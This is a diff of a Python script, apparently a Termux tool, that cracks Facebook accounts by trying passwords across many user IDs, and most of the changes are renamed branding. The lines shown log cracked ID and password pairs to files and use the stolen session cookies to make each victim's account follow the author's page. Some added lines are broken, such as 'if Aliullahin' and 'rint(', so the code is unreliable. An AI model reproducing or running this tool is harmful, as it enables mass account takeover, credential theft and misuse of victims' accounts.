@@ -170,7 +170,7 @@ def back():
 
 
 
-🦋⃟ALIULLAH🦋⃟="🦋⃟ALIULLAH🦋⃟-"
+🦋⃟ALIULLAH🦋⃟="Aliullah"
 
 imt="-Busra4786=="
 
@@ -180,11 +180,11 @@ myid=uuid.uuid4().hex[:10].upper()
 
 try:
 
-	key1 = open('/data/data/com.termux/files/usr/bin/.mr🦋⃟ALIULLAH🦋⃟-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrAliullahcov', 'r').read()
 
 except:
 
-	kok=open('/data/data/com.termux/files/usr/bin/.mr🦋⃟ALIULLAH🦋⃟-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.mrAliullahcov', 'w')
 
 	kok.write(myid+imt)
 
@@ -620,7 +620,7 @@ def crack(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ 🦋⃟ALIULLAH🦋⃟ ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Aliullah] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -650,7 +650,7 @@ def crack(idf,pwv):
 
 				cp +=1
 
-				print( f'\r\x1b[1;91m [ 🦋⃟ALIULLAH🦋⃟-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ AliullahCP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -664,7 +664,7 @@ def crack(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ 🦋⃟ALIULLAH🦋⃟-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ AliullahOK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
@@ -698,7 +698,7 @@ def free(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ 🦋⃟ALIULLAH🦋⃟ ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Aliullah] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -726,7 +726,7 @@ def free(idf,pwv):
 
 			if "checkpoint" in po.cookies.get_dict().keys():
 
-				rint( f'\r\x1b[1;91m [ 🦋⃟ALIULLAH🦋⃟-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ AliullahCP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -740,13 +740,13 @@ def free(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ 🦋⃟ALIULLAH🦋⃟-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ AliullahOK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
 				ok.append(wrt)
 
-				open('/sdcard/🦋⃟ALIULLAH🦋⃟-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/AliullahOK.txt','a').write('%s\n' % wrt)
 
 				follow(ses,coki)
 
@@ -768,7 +768,7 @@ def follow(ses,coki):
 
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://www.facebook.com/BrokeN.KinG789', cookies={'cookie': coki}).text, 'html.parser')
 
 	get = r.find('a', string='Follow').get('href')
 
@@ -779,13 +779,13 @@ def follow(ses,coki):
 logo = ("""\033[1;32m
 
 \033[32;1m╔════════════════════════════╗
-\033[32;1m║\033[32;1m🦋⃟ALIULLAH🦋⃟EHC \033[37;1mEH     EH  \033[34;1m#🦋⃟ALIULLAH🦋⃟ ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
+\033[32;1m║\033[32;1m🦋⃟ALIULLAH🦋⃟EHC \033[37;1mEH     EH  \033[34;1m#Aliullah║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║\033[32;1mEH       \033[37;1mEH     EH \033[34;1mEH    EH ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║\033[32;1mEH       \033[37;1mEH     EH \033[34;1mEH       ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
-\033[32;1m║\033[32;1m#🦋⃟ALIULLAH🦋⃟  \033[37;1m🦋⃟ALIULLAH🦋⃟EHC# \033[34;1mEH       ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
+\033[32;1m║\033[32;1m#Aliullah \033[37;1m🦋⃟ALIULLAH🦋⃟EHC# \033[34;1mEH       ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║\033[32;1mEH       \033[37;1mEH     EH \033[34;1mEH       ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║\033[32;1mEH       \033[37;1mEH     EH \033[34;1mEH    EH ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
-\033[32;1m║\033[32;1m🦋⃟ALIULLAH🦋⃟EHC \033[37;1mEH     EH  \033[34;1m#🦋⃟ALIULLAH🦋⃟  ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
+\033[32;1m║\033[32;1m🦋⃟ALIULLAH🦋⃟EHC \033[37;1mEH     EH  \033[34;1m#Aliullah ║\033[37;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m╚════════════════════════════╝
 \033[32;1m╔═════════════════════════════════════════════╗
 \033[32;1m║
@@ -806,10 +806,10 @@ logo = ("""\033[1;32m
               
 \033[32;1m╚═════════════════════════════════════════════╝
 \033[32;1m╔══════════════════════════════════════╗
-\033[32;1m║[🔵]\033[1;37m𝐀𝐔𝐓𝐇𝐎𝐑_________\033[32;1m🦋⃟ALIULLAH🦋⃟           ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
+\033[32;1m║[🔵]\033[1;37m𝐀𝐔𝐓𝐇𝐎𝐑_________\033[32;1mAliullah          ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║[🔵]\033[1;37m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊______\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵     ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║[🔵]\033[1;37m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏______\033[32;1m 01404125391    ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
-\033[32;1m║[🔵]\033[1;37m𝐆𝐈𝐓𝐇𝐔𝐁__________\033[32;1m-🦋⃟ALIULLAH🦋⃟ 901 ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
+\033[32;1m║[🔵]\033[1;37m𝐆𝐈𝐓𝐇𝐔𝐁__________\033[32;1m-Aliullah901 ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║[🔵]\033[1;37m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌___________\033[32;1m01404125391║\033[32;1m🦋⃟BAHJID✮⃝CHOWDHUARY𝄟⃝🔵
 \033[32;1m║[🔵]\033[1;37m𝐈𝐌𝐎______________\033[32;1m01404125391   ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
 \033[32;1m║[🔵]\033[1;37m𝐅𝐑𝐎𝐌____________\033[32;1m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║\033[32;1m🦋⃟ALIULLAH✮⃝SUMON𝄟⃝🔵
@@ -845,25 +845,25 @@ class Main:
 
 		print(" [E] \033[32;1mExit \033[31;1mProgramming\n")
 
-		🦋⃟ALIULLAH🦋⃟ =input(" Choose : ")
+		Aliullah=input(" Choose : ")
 
-		if 🦋⃟ALIULLAH🦋⃟ in ["1", "01"]:
+		if Aliullahin ["1", "01"]:
 
 			File()
 
-		if 🦋⃟ALIULLAH🦋⃟ in ["2", "02"]:
+		if Aliullahin ["2", "02"]:
 
 			Public()
 
-		if 🦋⃟ALIULLAH🦋⃟ in ["3", "03"]:
+		if Aliullahin ["3", "03"]:
 
 			os.system("python Dump.py")
 
-		if 🦋⃟ALIULLAH🦋⃟ in ["4", "04"]:
+		if Aliullahin ["4", "04"]:
 
 			self.old()
 
-		if 🦋⃟ALIULLAH🦋⃟ in ["5", "05"]:
+		if Aliullahin ["5", "05"]:
 
 			self.old2()
 
@@ -1669,7 +1669,7 @@ class Main:
 
 		sys.stdout.write(
 
-			"\r [ 🦋⃟ALIULLAH🦋⃟ ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ Aliullah] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 
 		); sys.stdout.flush()
 
@@ -1709,17 +1709,17 @@ class Main:
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009-MAHID×🦋⃟ALIULLAH🦋⃟-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-MAHID×AliullahOk.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;92m[ ASIF×🦋⃟ALIULLAH🦋⃟-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ASIF×AliullahOK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009-🦋⃟ALIULLAH🦋⃟-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-AliullahOK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
@@ -2523,7 +2523,7 @@ class Main:
 
 		sys.stdout.write(
 
-			"\r [🦋⃟ALIULLAH🦋⃟ ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Aliullah] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 
 		); sys.stdout.flush()
 
@@ -2557,23 +2557,23 @@ class Main:
 
 			if "session_key" in response.text and "EAAA" in response.text:
 
-				print("\r \033[0;92m[ 🦋⃟ALIULLAH🦋⃟-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ AliullahOK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				print ("\r \033[0;92m Congrats Bro ")
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009-🦋⃟ALIULLAH🦋⃟-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-AliullahOk.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;92m[ 🦋⃟ALIULLAH🦋⃟-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ AliullahOK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009-🦋⃟ALIULLAH🦋⃟-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-AliullahOK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
@@ -2623,7 +2623,7 @@ def Subscraption():
 
 		print ("")
 
-		print(" \033[1;32m 🦋⃟ALIULLAH🦋⃟ Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m AliullahToll Paid You Need Get Approved First\033[1;37m\n")
 
 		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
 
